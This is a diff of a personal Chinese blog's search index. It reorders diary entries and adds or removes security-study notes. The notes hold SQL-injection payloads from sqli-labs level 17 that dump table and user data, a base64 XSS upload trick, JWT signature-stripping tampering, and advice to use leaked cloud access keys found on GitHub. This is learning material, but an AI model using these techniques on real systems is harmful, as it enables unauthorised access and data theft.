@@ -71,37 +71,6 @@
       </tags>
   </entry>
   <entry>
-    <title>锦瑟</title>
-    <url>/2022/11/05/Diary_1105/</url>
-    <content><![CDATA[<p><img src="/images/Holo.png" alt="Holo"></p>
-<span id="more"></span>
-
-<h1 id="随便说点"><a href="#随便说点" class="headerlink" title="随便说点"></a>随便说点</h1><p>啊，今天是我第一天写日志。摸索中…</p>
-<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>今天突然回想起一首诗，是李商隐的《锦瑟》。我还蛮喜欢的。<br>      <strong>锦瑟</strong>  李商隐<br>锦瑟无端五十弦，一弦一柱思华年。<br>庄生晓梦迷蝴蝶，望帝春心托杜鹃。<br>沧海月明珠有泪，蓝田日暖玉生烟。<br>此情可待成追忆，只是当时已惘然。</p>
-<p>一开始没想起来诗句，后面一想起来全托出来了。<br>上网搜的时候，看到了一个人评价这首诗–<strong>美在解与不解之中</strong><br>说得挺好的，换个词即为<strong>朦胧感</strong>。</p>
-<h1 id="来说说今天做了什么吧。"><a href="#来说说今天做了什么吧。" class="headerlink" title="来说说今天做了什么吧。"></a>来说说今天做了什么吧。</h1><ol>
-<li><p>上午python爬虫的网课，但课程是两年前的。因此导致很多地方对不上，即便照着参考代码写也会报错…虽然是因为我买了课没有及时学，但问群里的主讲老师也不会，这样的服务态度着实让我不适。网易云课堂上的大熊课堂python，讲得还是挺清晰，但布置的作业和视频上的代码都无法正常运行那也很糟糕。<br>给我的教训是：<em>买了有时效性的网课要及时学</em></p>
-</li>
-<li><p>下午睡了俩小时，午睡时间太长了。但半小时又会很快感觉困，高中的时候也没这样啊。看来还是压力不够，决定明天睡眠时间缩短到1h以内，如果感觉困，就用冷水浇醒自己。<br>先看看这样是否行得通吧。</p>
-</li>
-<li><p>之后看了Web安全的基础–SQL注入漏洞。今天主要是看书《Web安全深度剖析》，SQL注入这一章是看完了，看得比较快，倒懂不懂的感觉吧。主要是过一遍，明天看视频。</p>
-</li>
-<li><p>最后学了半小时JS。还是在网易云课堂上学的，看的leo老师的网课。讲得蛮清晰，目前感觉良好。</p>
-</li>
-<li><p>24:30的《孤独摇滚》动画更新了，看动画去了。</p>
-</li>
-</ol>
-<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>日志写到这里，下次缩减一些，今天都写了半个多小时了</p>
-]]></content>
-      <categories>
-        <category>日志</category>
-      </categories>
-      <tags>
-        <tag>生活</tag>
-        <tag>日志</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CTFHUB-find_it</title>
     <url>/2022/12/15/CTFHUB-find_it/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>需要自己的后台扫描工具，手工尝试太慢了…</p>
@@ -193,6 +162,37 @@
       </categories>
       <tags>
         <tag>CSRF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>锦瑟</title>
+    <url>/2022/11/05/Diary_1105/</url>
+    <content><![CDATA[<p><img src="/images/Holo.png" alt="Holo"></p>
+<span id="more"></span>
+
+<h1 id="随便说点"><a href="#随便说点" class="headerlink" title="随便说点"></a>随便说点</h1><p>啊，今天是我第一天写日志。摸索中…</p>
+<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>今天突然回想起一首诗，是李商隐的《锦瑟》。我还蛮喜欢的。<br>      <strong>锦瑟</strong>  李商隐<br>锦瑟无端五十弦，一弦一柱思华年。<br>庄生晓梦迷蝴蝶，望帝春心托杜鹃。<br>沧海月明珠有泪，蓝田日暖玉生烟。<br>此情可待成追忆，只是当时已惘然。</p>
+<p>一开始没想起来诗句，后面一想起来全托出来了。<br>上网搜的时候，看到了一个人评价这首诗–<strong>美在解与不解之中</strong><br>说得挺好的，换个词即为<strong>朦胧感</strong>。</p>
+<h1 id="来说说今天做了什么吧。"><a href="#来说说今天做了什么吧。" class="headerlink" title="来说说今天做了什么吧。"></a>来说说今天做了什么吧。</h1><ol>
+<li><p>上午python爬虫的网课，但课程是两年前的。因此导致很多地方对不上，即便照着参考代码写也会报错…虽然是因为我买了课没有及时学，但问群里的主讲老师也不会，这样的服务态度着实让我不适。网易云课堂上的大熊课堂python，讲得还是挺清晰，但布置的作业和视频上的代码都无法正常运行那也很糟糕。<br>给我的教训是：<em>买了有时效性的网课要及时学</em></p>
+</li>
+<li><p>下午睡了俩小时，午睡时间太长了。但半小时又会很快感觉困，高中的时候也没这样啊。看来还是压力不够，决定明天睡眠时间缩短到1h以内，如果感觉困，就用冷水浇醒自己。<br>先看看这样是否行得通吧。</p>
+</li>
+<li><p>之后看了Web安全的基础–SQL注入漏洞。今天主要是看书《Web安全深度剖析》，SQL注入这一章是看完了，看得比较快，倒懂不懂的感觉吧。主要是过一遍，明天看视频。</p>
+</li>
+<li><p>最后学了半小时JS。还是在网易云课堂上学的，看的leo老师的网课。讲得蛮清晰，目前感觉良好。</p>
+</li>
+<li><p>24:30的《孤独摇滚》动画更新了，看动画去了。</p>
+</li>
+</ol>
+<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>日志写到这里，下次缩减一些，今天都写了半个多小时了</p>
+]]></content>
+      <categories>
+        <category>日志</category>
+      </categories>
+      <tags>
+        <tag>生活</tag>
+        <tag>日志</tag>
       </tags>
   </entry>
   <entry>
@@ -453,25 +453,6 @@
       </tags>
   </entry>
   <entry>
-    <title>默哀</title>
-    <url>/2022/11/28/Diary_1128/</url>
-    <content><![CDATA[<p><img src="/images/Say.jpg" alt="黑格尔《精神现象学》"></p>
-<span id="more"></span>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>原谅我这一生放纵不羁爱自由。</p>
-<h1 id="一句话"><a href="#一句话" class="headerlink" title="一句话"></a>一句话</h1><p>Give me liberty, or give me death!<br>不自由，毋宁死！<br>--帕特里克·亨利</p>
-<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>我本可以忍受黑暗<br>如果我不曾见过太阳<br>然而阳光已使我的荒凉<br>成为更新的荒凉<br>--艾米莉·狄金森《如果我不曾见过太阳》</p>
-<h1 id="怎样生活"><a href="#怎样生活" class="headerlink" title="怎样生活"></a>怎样生活</h1><p>顾及太多，就不自由了。很多人，其实并非是不愿意去呼喊自由，而是身边的家人朋友乃至职业社会地位等等限制了他们。<br>所以在一个不自由的地方，呼喊自由的人，往往是年轻人以及一无所有的人。<br>这些我都不想探讨。我只想说一个话题：<br>做一只快乐的猪，还是做一个痛苦的人？<br>这是苏格拉底的一句名言，他的回答是后者。我也是。<br>我不知道这样伟大的哲学家是怎么思考的。我只知道，生命的奇迹是如此美妙，做平庸的人未免太过无聊。况且活着的喜悦是不会消失的，只要还活着，一切痛苦都无法冲散活着的那份喜悦。畏畏缩缩安分守己或许是某些人的生活方式，但不是我的作风。我也不愿与这样的人为伍。<br>我承认，我并不是完全有勇气，也不是毫无利己之心。可我更不愿因自身之枷锁而放弃对勇气等品质的追求。</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>今天想到的两句话，比较激进，加个密(Base58_STRING utf-8)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3jDiNnSuNi6BJfuv5SCFofiTrp2pVd1erpsBoJbtp9U4N7CY9J77d8FugTKcno8nQg6M7Ytr2CLcMWmBeBhqtAeTswsaRupadz5vggntxPWvXao8gDZrfY2SZmULh</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>日志</category>
-      </categories>
-      <tags>
-        <tag>生活</tag>
-        <tag>日志</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>年末月初</title>
     <url>/2022/12/01/Diary_1201/</url>
     <content><![CDATA[<p><img src="/images/12.jpg" alt="彼岸花"></p>
@@ -482,6 +463,25 @@
 <h1 id="灵感"><a href="#灵感" class="headerlink" title="灵感"></a>灵感</h1><p>有时候写点东西，有灵感，便如洪水般涌出。没有灵感的时候，想挤点啥都困难呢。而我写了这么多日记，今天是第一次感觉自己有点灵感。碍于时间也只能匆匆结束。<br>曾想象自己是一个作家，也许每天都在挤榨自己脑海里的一点油墨吧。</p>
 <h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>我想看书的啊，又到这个时候了，烦诶。<br>明天一定要看叔本华的 <strong>作为意志和表象的世界</strong>！</p>
 ]]></content>
+      <categories>
+        <category>日志</category>
+      </categories>
+      <tags>
+        <tag>生活</tag>
+        <tag>日志</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>默哀</title>
+    <url>/2022/11/28/Diary_1128/</url>
+    <content><![CDATA[<p><img src="/images/Say.jpg" alt="黑格尔《精神现象学》"></p>
+<span id="more"></span>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>原谅我这一生放纵不羁爱自由。</p>
+<h1 id="一句话"><a href="#一句话" class="headerlink" title="一句话"></a>一句话</h1><p>Give me liberty, or give me death!<br>不自由，毋宁死！<br>--帕特里克·亨利</p>
+<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>我本可以忍受黑暗<br>如果我不曾见过太阳<br>然而阳光已使我的荒凉<br>成为更新的荒凉<br>--艾米莉·狄金森《如果我不曾见过太阳》</p>
+<h1 id="怎样生活"><a href="#怎样生活" class="headerlink" title="怎样生活"></a>怎样生活</h1><p>顾及太多，就不自由了。很多人，其实并非是不愿意去呼喊自由，而是身边的家人朋友乃至职业社会地位等等限制了他们。<br>所以在一个不自由的地方，呼喊自由的人，往往是年轻人以及一无所有的人。<br>这些我都不想探讨。我只想说一个话题：<br>做一只快乐的猪，还是做一个痛苦的人？<br>这是苏格拉底的一句名言，他的回答是后者。我也是。<br>我不知道这样伟大的哲学家是怎么思考的。我只知道，生命的奇迹是如此美妙，做平庸的人未免太过无聊。况且活着的喜悦是不会消失的，只要还活着，一切痛苦都无法冲散活着的那份喜悦。畏畏缩缩安分守己或许是某些人的生活方式，但不是我的作风。我也不愿与这样的人为伍。<br>我承认，我并不是完全有勇气，也不是毫无利己之心。可我更不愿因自身之枷锁而放弃对勇气等品质的追求。</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>今天想到的两句话，比较激进，加个密(Base58_STRING utf-8)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3jDiNnSuNi6BJfuv5SCFofiTrp2pVd1erpsBoJbtp9U4N7CY9J77d8FugTKcno8nQg6M7Ytr2CLcMWmBeBhqtAeTswsaRupadz5vggntxPWvXao8gDZrfY2SZmULh</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>日志</category>
       </categories>
@@ -591,6 +591,24 @@
       </tags>
   </entry>
   <entry>
+    <title>谁最可靠</title>
+    <url>/2023/02/20/Diary_20230220/</url>
+    <content><![CDATA[<p><img src="/images/Holo_8.png" alt="Holo"></p>
+<span id="more"></span>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一个人的一生有许多关系。亲人，亲戚，朋友，熟人，伴侣……谁是最可能可靠的呢？</p>
+<h1 id="亲人之间"><a href="#亲人之间" class="headerlink" title="亲人之间"></a>亲人之间</h1><p>我们最开始也是最常见的亲人，无疑就是爷爷奶奶外公外婆父母兄弟姐妹了。<br>父母大了我们一代，爷爷奶奶外公外婆大了我们两代，阅历必然是要高于我们的，也有一代人独特的认知。因出生时代的不同，所处立场的不同，教育能力的不足等等，大多数父母无法对待孩子像对待朋友那样。也即长辈很难真正意义上与孩子交心，隔阂自然也是有的。<br>年龄相差过大的兄弟姐妹大多也会有类似的情况。但年龄较为接近的兄弟姐妹之间就要好得多了。</p>
+<p>亲人是我们来到这个世界上产生的第一类亲密关系。这类亲密关系建立起来最根本的原因就是血缘。无论父母起初是以怎样的心情对待孩子，在朝夕相处的时光中，相互之间蕴含的感情也会慢慢增加。如果作为长辈的亲人给予孩子的负面情感与正面情感相差不远甚至负面比正面多，那么父母与孩子之间很难建立稳固的关系。彼此之间或许也不会认为对方是可靠的存在。</p>
+<p>当然，每个人所处的情况不尽相同。不知他人境遇，也莫言是非论调。总的来说，我认为，在一个家庭中主要由对方造成的负面影响（比如家暴、虐待、欺骗等）没有达到自己有点难以承受的地步，彼此之间的关系应当还是能稳定存在的。在这个前提下，亲人之间的联系应当建立在较高层面，只要不是做了过分的事，不应轻易被动摇。</p>
+<h1 id="未完待续…"><a href="#未完待续…" class="headerlink" title="未完待续…"></a>未完待续…</h1>]]></content>
+      <categories>
+        <category>日志</category>
+      </categories>
+      <tags>
+        <tag>生活</tag>
+        <tag>日志</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>道理与觉悟：为什么现代人看起来越来越聪明，却越来越难以理解“道理”？</title>
     <url>/2023/02/19/Diary_20230219/</url>
     <content><![CDATA[<p><img src="/images/1.png" alt="yuru camp"></p>
@@ -624,24 +642,6 @@
       </tags>
   </entry>
   <entry>
-    <title>谁最可靠</title>
-    <url>/2023/02/20/Diary_20230220/</url>
-    <content><![CDATA[<p><img src="/images/Holo_8.png" alt="Holo"></p>
-<span id="more"></span>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一个人的一生有许多关系。亲人，亲戚，朋友，熟人，伴侣……谁是最可能可靠的呢？</p>
-<h1 id="亲人之间"><a href="#亲人之间" class="headerlink" title="亲人之间"></a>亲人之间</h1><p>我们最开始也是最常见的亲人，无疑就是爷爷奶奶外公外婆父母兄弟姐妹了。<br>父母大了我们一代，爷爷奶奶外公外婆大了我们两代，阅历必然是要高于我们的，也有一代人独特的认知。因出生时代的不同，所处立场的不同，教育能力的不足等等，大多数父母无法对待孩子像对待朋友那样。也即长辈很难真正意义上与孩子交心，隔阂自然也是有的。<br>年龄相差过大的兄弟姐妹大多也会有类似的情况。但年龄较为接近的兄弟姐妹之间就要好得多了。</p>
-<p>亲人是我们来到这个世界上产生的第一类亲密关系。这类亲密关系建立起来最根本的原因就是血缘。无论父母起初是以怎样的心情对待孩子，在朝夕相处的时光中，相互之间蕴含的感情也会慢慢增加。如果作为长辈的亲人给予孩子的负面情感与正面情感相差不远甚至负面比正面多，那么父母与孩子之间很难建立稳固的关系。彼此之间或许也不会认为对方是可靠的存在。</p>
-<p>当然，每个人所处的情况不尽相同。不知他人境遇，也莫言是非论调。总的来说，我认为，在一个家庭中主要由对方造成的负面影响（比如家暴、虐待、欺骗等）没有达到自己有点难以承受的地步，彼此之间的关系应当还是能稳定存在的。在这个前提下，亲人之间的联系应当建立在较高层面，只要不是做了过分的事，不应轻易被动摇。</p>
-<h1 id="未完待续…"><a href="#未完待续…" class="headerlink" title="未完待续…"></a>未完待续…</h1>]]></content>
-      <categories>
-        <category>日志</category>
-      </categories>
-      <tags>
-        <tag>生活</tag>
-        <tag>日志</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>回顾40天（4.1-5.9）</title>
     <url>/2023/05/09/Diary_20230509/</url>
     <content><![CDATA[<p><img src="/images/ocean.png" alt="Ocean"></p>
@@ -665,6 +665,29 @@
 <p>总的来说，<br>这样的交换，是否好呢？<br>目前我还无法看清，姑且判断为等价交换吧。不算值得，也不算太亏。</p>
 <h1 id="选择"><a href="#选择" class="headerlink" title="选择"></a>选择</h1><p>实际上，要以此为起点，做成主业，并非是不可能。<br>但我不想选择这种，竞争性门槛低的工作。<br>这种事，只要了解了其中的流程，谁都能做到。<br>被人抢走市场份额，那是迟早的事。<br>我不想长期做这种看不到未来的事。<br>况且，这种业务是基于变化很大的网络。即便专业，也随时可能颠覆。</p>
 <h1 id="今后"><a href="#今后" class="headerlink" title="今后"></a>今后</h1><p>既然选择了仅仅把这个业务当作是赚取零花钱的副业，那么其重要性就不高了。<br>掂清轻重，所以要学会选择。<br>今天写这篇，也是为了下定决心。<br>早睡！早起！<br>从明天开始，就尽全力恢复以前的生活节奏吧。</p>
+]]></content>
+      <categories>
+        <category>日志</category>
+      </categories>
+      <tags>
+        <tag>生活</tag>
+        <tag>日志</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>惊叹</title>
+    <url>/2023/05/12/Diary_20230512/</url>
+    <content><![CDATA[<p><img src="/images/%E5%BE%A1%E5%9D%82%E7%BE%8E%E7%90%B44.png" alt="御坂美琴"></p>
+<span id="more"></span>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>偶尔写写日记，感受自己的变化，不也挺好吗？</p>
+<h1 id="名言"><a href="#名言" class="headerlink" title="名言"></a>名言</h1><p>人们阅读了太多无聊的东西。这只是在浪费时间、却一无所获。人首先应该永远只读那些让人惊叹的东西。<br>                        –歌德</p>
+<h1 id="依靠"><a href="#依靠" class="headerlink" title="依靠"></a>依靠</h1><p>很难有人能完全依靠，能依靠的只有自己。<br>因为人很难控制他人的行动，并达到自身的目的。只有自身是能够较为轻松控制的，倘若自己都无法控制自己，那就别提他人。<br>因此，公司开的越大，就越困难，因为要让员工和老板保持一心，才能获得收益。<br>试图将自己的事全部交给别人去做，那完全是偷懒。而偷懒也最终会付出代价。我在最近两天便是承受了这个代价，这让我意识到，大部分关乎自身利益的事，只要能亲历亲为，尽量亲历亲为。</p>
+<h1 id="道理"><a href="#道理" class="headerlink" title="道理"></a>道理</h1><p>很多道理，我往往是意识到了形成觉悟。然而，过一段时间后，这觉悟又会慢慢地如失效的疫苗般，离开了我，让我不再遵守这样的准则。就如上面的道理。<br>真希望，这些觉悟能够贯穿我的一生。</p>
+<h1 id="不满"><a href="#不满" class="headerlink" title="不满"></a>不满</h1><p>实际上，最近这几天，给我利益带来极大损失的那位朋友，我确实是有不满的。原因很简单，因为我认为做这个事并不会对他造成多少损失，却能挽回我极大的损失。在一些小事上带来一点损失无所谓，但是在关键的事情上仍然选择与小事同样的策略，那就是愚蠢与不靠谱了。</p>
+<p>我一直认为，鸡毛蒜皮的事不应去计较。人生没有太多时间，去浪费在这些无聊的小事上，而应如歌德所说，我们永远应当把自己的注意力放在让人惊叹的东西上。</p>
+<p>所以，我不再愿意去浪费时间，扯鸡毛蒜皮，讨价还价，试图说服谁。我向来觉得这样的过程是无趣的，只是今天终于有了这样的觉悟。</p>
+<p>当然，即使不满，也不过如此而已。对人的怨气抑或是愤怒，不过是毫无价值的附加物。用这样一个代价，去换取不要依靠别人的觉悟，也只能算是等价交换，那就更不应当让负面的附属品停留在我身上。</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>就这样吧，早点睡了~</p>
 ]]></content>
       <categories>
         <category>日志</category>
@@ -1587,6 +1610,80 @@ ThinkPHP5.x的命令执行
         <tag>SQL注入</tag>
         <tag>字符型</tag>
         <tag>数字型</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SRC_course_1</title>
+    <url>/2023/05/11/SRC_course_1/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>SRC的课开始了，记点笔记比较好。</p>
+<span id="more"></span>
+<h1 id="Burp使用"><a href="#Burp使用" class="headerlink" title="Burp使用"></a>Burp使用</h1><ol>
+<li><p>过滤心跳包<br>（1）使用代理插件（如SwitchOmega），将不想抓包的网址放入。<br>（2）或者使用Burp，过滤一些不需要显示的数据包。</p>
+</li>
+<li><p>爆破模块<br>想要对比返回包的时候，可以将Response的内容发送到Comparer。然后选择Words或byte比对。</p>
+</li>
+<li><p>app抓包<br>iPhone教程，在WiFi栏配置代理，然后配置与Burp一样的IP和端口。<br>配置好后，在浏览器上打开IP和端口，将Burp的配置文件下载到手机上。<br>之后在“通用”-&gt;”VPN与设备管理”-&gt;安装该配置文件<br>最后测试能否抓包。可以则证明该手机型号成功，不可以则证明该手机型号不可抓包。</p>
+</li>
+</ol>
+<p>tips:<br>抓包的时候乱码，说明做了app加固，或是Burp中设置的字体有问题。</p>
+<ol start="4">
+<li><p>模拟器抓包<br>官网下载地址： <code>http://mumu.163.com</code><br>BurpSuite设置监听局域网内IP（这个IP是电脑当前IP，端口任意选择）<br>MuMu模拟器那边设置（设置-WLAN-长按WiFi名-修改网络-填好，保存）<br>代理为之前填写的ip+端口<br>然后用模拟器自带浏览器访问BurpSuite的页面（ip+端口），下载证书<br>再使用自带文件管理，找到下载的证书，将文件后缀改为.cer<br>修改后缀方式：长按所要修改的文件即可。<br>安装成功后，在受信任的凭据（设置-安全-信任的凭据）内看到刚刚安装的证书<br>打开app，打开网站，都成功抓包。证明成功。</p>
+</li>
+<li><p>微信小程序抓包<br>建议直接用电脑版微信抓包即可，核心思路是设置全局代理。<br>win注意事项：<br>微信抓包找到这个文件<br><code>C:\Users\HoAd\AppData\Roaming\Tecent\WeChat\XPlugun\Plugins\WMPFRuntime</code><br>删掉这个目录的文件，然后重启微信。<br>Mac:知识星球里</p>
+</li>
+</ol>
+<h1 id="Docker使用"><a href="#Docker使用" class="headerlink" title="Docker使用"></a>Docker使用</h1><p>基于Ubuntu安装docker</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get upgrade</span><br><span class="line">sudo apt-get install docker</span><br><span class="line">sudo apt install docker-compose</span><br><span class="line">sudo docker version</span><br></pre></td></tr></table></figure>
+
+<p>常用命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose pull  //拉取docker-compose.yml或docker-stack.yml文件中定义的服务关联的镜像</span><br><span class="line"></span><br><span class="line">docker-compose up -d  //在后台启动容易并使它们保持运行</span><br><span class="line"></span><br><span class="line">sudo service docker start  //启动docker</span><br><span class="line"></span><br><span class="line">sudo service docker stop  //停止docker</span><br><span class="line"></span><br><span class="line">sudo service docker restart  //重启docker</span><br><span class="line"></span><br><span class="line">docker --version</span><br><span class="line">docker version</span><br><span class="line">docker info  //显示Docker版本和信息</span><br><span class="line"></span><br><span class="line">docker image ls  //列出镜像列表</span><br></pre></td></tr></table></figure>
+
+<h2 id="dvwa的安装"><a href="#dvwa的安装" class="headerlink" title="dvwa的安装"></a>dvwa的安装</h2><p>使用 <code>docker serach</code> 关键字，输入想找的镜像，然后再pull下来，这里选择<br>citizenstig&#x2F;dvwa:<br><code>docker pull citizenstig/dvwa</code></p>
+<p>创建容易（此处将容易重命名了为dvwa）：<br><code>docker run --name dvwa -d -p 9001:80 citizentig/dvwa</code></p>
+<p>访问该地址后，先初始化数据库。点击Create&#x2F;Reset Database即可</p>
+<p>tips:<br>抓包的话，可以使用电脑本机IP打开DVWA，这样即可抓包。</p>
+]]></content>
+      <categories>
+        <category>SRC</category>
+      </categories>
+      <tags>
+        <tag>SRC</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SRC_course_2</title>
+    <url>/2023/05/11/SRC_course_2/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>逐渐开始步入正轨…</p>
+<span id="more"></span>
+<h1 id="Burp插件"><a href="#Burp插件" class="headerlink" title="Burp插件"></a>Burp插件</h1><p>tips:<br>建议插件本地加载。</p>
+<ol>
+<li>Burp插件推荐<br>HaE<br>wooyun-payload<br>shiro<br>FastJson</li>
+</ol>
+<h1 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h1><p>MD5不是加密算法，是摘要算法。<br><a href="www.cmd5.com">MD5加解密</a></p>
+<p>32位或16位，可以去尝试是否为MD5。<br>如果试不出来，那么可能是随机字符。</p>
+<h1 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h1><p>绝活</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">图片上传</span><br><span class="line">data:image/png;base64,PGltZyBzcmM9MSBvbmVycm9yPWFsZXJ0KDEpPg==</span><br><span class="line"></span><br><span class="line">替换为</span><br><span class="line"></span><br><span class="line">data:text/html;base64,PGltZyBzcmM9MSBvbmVycm9yPWFsZXJ0KDEpPg==</span><br><span class="line"></span><br><span class="line">这样就不会出现filename</span><br></pre></td></tr></table></figure>
+
+<h1 id="jwt-JSON-Web-Token"><a href="#jwt-JSON-Web-Token" class="headerlink" title="jwt(JSON Web Token)"></a>jwt(JSON Web Token)</h1><p><a href="jwt.io">JWT网站</a></p>
+<p>使用场景：<br>抓包后，在Auth字段可能会有jwt<br>示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Auth:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span><br></pre></td></tr></table></figure>
+
+<p>eyJ开头的字段，证明是jwt格式。<br>第一部分：Header(头部)<br>第二部分：Payload(负载)<br>第三部分：Signature(签名)</p>
+<p>JWT默认不加密，只是Base64编码，任何人都可以读到。</p>
+<p>正常挖洞的流程：<br>将签名删除，修改数据体。</p>
+<p>修改数据体的方式：将数据体通过base64解密，修改内容，再加密为base64格式。</p>
+<h1 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h1><p>面对一大堆cookie，需要逐步分析。<br>带有”+”,”&#x2F;“符号的字符串，有可能是AES加密。<br>面对AES加密字符，如果不知道及加密模式，填充，密钥，偏移量，输出方式。很难解密。<br>在企业做测试，去询问加密的方式等等。</p>
+<p>Token如果是纯数字，使用多个账号，如果能成功，则有越权漏洞。证明可遍历。</p>
+<p>或者挨个删除信息，看能否成功。</p>
+<p>不可动生产数据。</p>
+<p>先修改数据，不修改cookie。如果不能成再改其它。</p>
+<h1 id="OSS浏览器"><a href="#OSS浏览器" class="headerlink" title="OSS浏览器"></a>OSS浏览器</h1><p>AccessKeyId, AccessKeySecret利用可使用oss浏览器。<br><a href="help.aliyun.com">oss浏览器下载地址</a><br>扫AK,AS的泄露信息，或在GitHub搜索泄露信息。</p>
+]]></content>
+      <categories>
+        <category>SRC</category>
+      </categories>
+      <tags>
+        <tag>SRC</tag>
       </tags>
   </entry>
   <entry>
@@ -4156,45 +4253,6 @@ mysqli_multi_query()函数作用是：执行一个SQL语句，或者多个使用
       </tags>
   </entry>
   <entry>
-    <title>sqli-labs_17</title>
-    <url>/2022/11/11/sqli-labs_17/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本关开始有了新变化，是一个更新密码的页面，这说明已经成功进入了系统，接下来就看看如何解决吧。</p>
-<span id="more"></span>
-
-<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><ol>
-<li>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>如果不知道源码，去一遍遍尝试，会发现无论是布尔盲注还是时间盲注都无法得到预期结果，因此我们可以采用报错注入。<br>首先，那我们可以从源码中发现，有一个过滤函数check_input，其过滤步骤是：</li>
-</ol>
-<ul>
-<li><code>substr($value,0,15)</code>截断到15位</li>
-<li>单引号，双引号，反斜杠，null自动使用反斜杠转义</li>
-<li>stripslashes()去掉多余的反斜杠<br>然后，passwd没有使用过滤函数过滤，因而可以进行注入。由此可使用报错注入。</li>
-</ul>
-<ol start="2">
-<li><p>获取当前<strong>数据库名和数据库版本号</strong><br>第一个用户名填写：admin<br>第二个密码填写所需的报错注入：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123&#x27; and (updatexml(1,concat(0x5c,version(),0x5c),1))#     爆版本</span><br><span class="line">123&#x27; and (updatexml(1,concat(0x5c,database(),0x5c),1))#    爆数据库</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆表</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123&#x27; and (updatexml(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c),1))#      爆表名</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆字段名</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123&#x27; and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name =&#x27;users&#x27;),0x5c),1))#    爆字段名</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆数据</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27; and updatexml(1,concat(0x7e,(select username from (select username from users limit 0,1)test),0x7e),1) #  爆用户</span><br><span class="line">admin&#x27; and updatexml(1,concat(0x7e,(select username from (select username from users where username=&#x27;admin&#x27; limit 0,1)test),0x7e),1) #      爆密码</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>本关的重点在于找到注入方式，如何去通过报错注入获取所需信息。技术上仍然还是那些。也可参见第二篇致谢的其它报错函数注入。</p>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a><br><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a><br><a href="https://cloud.tencent.com/developer/article/1906116">全网最全sqli-labs通关攻略</a></p>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-        <category>sqli-labs</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-        <tag>sqli-labs</tag>
-      </tags>
-  </entry>
